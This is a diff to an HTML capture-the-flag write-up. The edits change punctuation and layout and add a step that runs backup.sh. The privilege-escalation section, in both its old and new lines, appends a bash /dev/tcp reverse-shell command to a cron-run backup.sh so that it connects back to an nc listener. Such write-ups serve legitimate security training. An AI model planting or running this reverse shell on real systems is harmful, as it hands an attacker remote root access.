@@ -414,7 +414,7 @@
             <p>
                 Having obtained the credentials for user grimmie, we can switch user and try to escalate to get access to the flag.
                 The system doesn't seem to have much options that we may take advantage of but good enough there's the possiblity to 
-                use crontab. Crontab can be viewed with the command <code>cat /etc/crontab</code>
+                use crontab. Crontab can be viewed with the command <code>cat /etc/crontab</code>.
             </p>
 
             <div class="screenshot">
@@ -425,7 +425,8 @@
             <p>
                 Haven seee the content of backup.sh, we can use bash tcp reverse shell to get privilege escalation.
                 We will <code>echo bash -i >& /dev/tcp/192.168.1.7/8081 0>&1 >> /home/grimmie/backup.sh</code> and 
-                listen on a different terminal with <code>nc -nlvp 8081</code>
+                listen on a different terminal with <code>nc -nlvp 8081</code>. After echoing into backup.sh file, 
+                we can run <code>./backup.sh</code>
             </p>
 
             <div class="screenshot">
@@ -438,8 +439,8 @@
                 <p>Figure 15 - Flag</p>
             </div>
 
-            <h2>Flag</h2>
-            <code>Congratz you rooted this box!</code>
+            <p>Flag: <code>Congratz you rooted this box!</code></p>
+            
 
             <h2>Conclusion</h2>
             
